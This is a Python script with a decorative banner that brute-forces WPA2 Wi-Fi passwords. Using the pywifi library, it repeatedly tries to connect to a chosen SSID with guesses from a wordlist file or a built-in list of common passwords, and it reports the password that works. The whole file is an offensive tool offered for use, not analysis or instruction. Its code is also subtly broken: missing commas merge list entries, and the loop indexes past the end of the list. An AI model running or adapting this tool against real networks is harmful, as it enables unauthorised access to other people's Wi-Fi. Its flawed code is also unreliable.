
from ast import Pass
import pywifi 
from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
import time
# Bold
BBlack="\033[1;30m"       # Black
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # Green
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCayn="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White
print(BRed+f'''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠘⣧⡈⠃⢰⡆⠘⢁⣼⠁⣸⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠘⠃⠀⢸⡇⠀⠘⠁⣰⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⢸⡇⠀⠀⠘⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀

{BYellow}instagram : fx_py3{BRed}
{BYellow}telegram : fx_py{BRed}


           {BPurple} [1] - {BYellow}password from the file 
           {BPurple} [2] - {BYellow}password from the tool 

''')
c = int(input(BCayn+'[+] - chose : '))
try:
    wifi=PyWiFi()
    INF=wifi.interfaces()[0]
    INF.scan()
    Rscan=INF.scan_results()
    
except:
    print("no INF X")
def main(SSID,PASSWORD):
    prof=Profile()
    prof.ssid=SSID
    prof.auth=const.AUTH_ALG_OPEN
    prof.akm.append(const.AKM_TYPE_WPA2PSK)
    prof.cipher=const.CIPHER_TYPE_CCMP
    prof.key=PASSWORD
    INF.remove_all_network_profiles()
    TEMP_PROF=INF.add_network_profile(prof)
    time.sleep(0.1)
    INF.connect(TEMP_PROF)
    time.sleep(6)
    if INF.status() == 4 :
        time.sleep(0.3)
        print('\n')
        print(BPurple+" = = "*5)
        print('\n')
        print(BGreen+f"""
        NAME is ==== > {SSID}
        password is TRUE  ====>""", PASSWORD)
        print('\n')
        print(BPurple+" = = "*5)
        print('\n')
        exit()
    else:
        print(BRed+f"""

        password is False ====>""", PASSWORD)
A=False
if c == 1:
   SSID=input(BCayn+'[+] - SSID : ')
   Pass=input(BCayn+'[+] - FILE PASSWORD : ')
   for i in range(1,100000):
    try :
        file = open(Pass, "r")
        for pas in file.readlines():
            main(SSID,pas)
    except:
        print(BRed+'file not found  -  X')
        exit()
if c == 2:
   SSID=input(BCayn+'[+] - SSID : ')
   for i in range(1,100000):
    pa=['123456','password','12345678','qwerty','123456789','klaster','112233'
        '11111111','12345678','987654321','87654321','Aa123456','1.2.3.4.5.6','h'
        'Aa12345','88888888','123123123','qwer1234','q1w2e3r4']
    pas=pa[i]
    main(SSID,pas)
